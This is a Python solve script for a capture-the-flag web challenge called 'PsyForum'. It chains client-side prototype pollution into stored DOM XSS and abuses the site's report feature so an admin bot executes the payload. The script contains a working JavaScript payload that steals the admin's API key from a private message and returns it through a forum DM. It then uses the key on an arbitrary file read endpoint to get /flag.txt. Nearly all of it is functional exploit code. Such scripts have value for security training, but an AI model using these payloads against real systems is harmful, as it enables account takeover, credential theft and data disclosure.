#!/usr/bin/env python3
"""
PsyForum solve script.

Vulnerability chain:
  1. Client-side prototype pollution in views/messages/conversation.ejs
     (`for...in` + Object.assign over attacker-controlled `settings.__proto__`)
     pollutes Object.prototype, making `window.chatConfig.badge` truthy and
     rendered via `.innerHTML` -> stored/gadget DOM XSS.
  2. The XSS payload runs in the admin bot's browser (triggered via the
     forum's own /report -> headless bot feature), reads the admin -> j3seer
     DM containing the internal API key, and exfiltrates it back to the
     attacker via a normal forum DM.
  3. The API key unlocks GET /settings?file=<path>, an arbitrary file read
     endpoint, used to read /flag.txt.

Usage:
  python3 solve.py --base http://localhost:3000 --report-host psyforum:3000
"""
import argparse
import json
import re
import time
import uuid

import requests

FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}]+\}")
KEY_RE = re.compile(r"~\s*([0-9a-fA-F]{20,40})")


def register(session, base, username, password):
    r = session.post(f"{base}/auth/register", json={
        "username": username,
        "display_name": username,
        "password": password,
        "password_confirm": password,
    })
    r.raise_for_status()
    data = r.json()
    if not data.get("success"):
        raise RuntimeError(f"registration failed: {data}")
    print(f"[+] registered attacker account: {username}")


def poison_profile(session, base, username, exfil_username):
    """Pollute Object.prototype via settings.__proto__.badge, sink is
    `badge.innerHTML = window.chatConfig.badge` in conversation.ejs."""
    js_payload = (
        "fetch('/messages/j3seer').then(r=>r.text()).then(t=>{"
        "var m=t.match(/~\\s*([0-9a-fA-F]{20,40})/);"
        "var key=m?m[1]:'NOMATCH:'+t.length;"
        "fetch('/messages/" + exfil_username + "',{"
        "method:'POST',headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({body:key})"
        "})"
        "});"
    )
    badge = f"<img src=x onerror=\"{js_payload}\">"

    body = {
        "display_name": username,
        "bio": "just a regular user",
        "settings": {
            "pokemon_type": "",
            "__proto__": {"badge": badge},
        },
    }
    r = session.post(f"{base}/users/{username}/edit", json=body)
    r.raise_for_status()
    data = r.json()
    if not data.get("success"):
        raise RuntimeError(f"profile edit failed: {data}")
    print("[+] planted prototype-pollution -> XSS payload in profile settings")


def trigger_bot(session, base, report_host, victim_username):
    """Abuse /report so the admin bot visits the conversation page for
    `victim_username`, loading the poisoned settings and firing the XSS
    as the admin."""
    url = f"http://{report_host}/messages/{victim_username}"
    r = session.post(f"{base}/report", json={"url": url})
    r.raise_for_status()
    if "Reported" not in r.text and r.status_code != 200:
        raise RuntimeError(f"report submission failed: {r.status_code}")
    print(f"[+] reported {url} to the admin bot, waiting for it to run...")


def wait_for_exfil(session, base, from_username, timeout=30, interval=2):
    """Poll our DM inbox with `from_username` (admin) for the exfiltrated
    API key sent by the XSS payload."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = session.get(f"{base}/messages/{from_username}")
        r.raise_for_status()
        m = re.search(r'class="message-bubble message-received">([0-9a-fA-F]{20,40})<', r.text)
        if m:
            key = m.group(1)
            print(f"[+] exfiltrated API key via DM: {key}")
            return key
        time.sleep(interval)
    raise RuntimeError("timed out waiting for XSS payload to exfiltrate the API key")


def read_flag(base, api_key, file_path="/flag.txt"):
    r = requests.get(f"{base}/settings", params={"file": file_path},
                      headers={"X-Api-Key": api_key})
    r.raise_for_status()
    data = r.json()
    if not data.get("exists"):
        raise RuntimeError(f"file read failed: {data}")
    print(f"[+] read {file_path} via /settings arbitrary file read")
    return data["config"]


def main():
    parser = argparse.ArgumentParser(description="PsyForum solve script")
    parser.add_argument("--base", default="http://localhost:3000",
                         help="base URL of the forum app (default: %(default)s)")
    parser.add_argument("--report-host", default="psyforum:3000",
                         help="host:port the app-internal bot uses to reach the forum "
                              "(WEB_DOM env var; must match what /report accepts). "
                              "For remote instances this is usually still the internal "
                              "docker hostname, see the /report page hint.")
    parser.add_argument("--flag-file", default="/flag.txt")
    args = parser.parse_args()

    username = f"hacker_{uuid.uuid4().hex[:8]}"
    password = "password123!"

    session = requests.Session()
    register(session, args.base, username, password)
    poison_profile(session, args.base, username, exfil_username=username)
    trigger_bot(session, args.base, args.report_host, victim_username=username)
    api_key = wait_for_exfil(session, args.base, from_username="admin")
    flag_contents = read_flag(args.base, api_key, args.flag_file)

    print()
    m = FLAG_RE.search(flag_contents)
    if m:
        print(f"FLAG: {m.group(0)}")
    else:
        print(f"file contents: {flag_contents!r}")


if __name__ == "__main__":
    main()
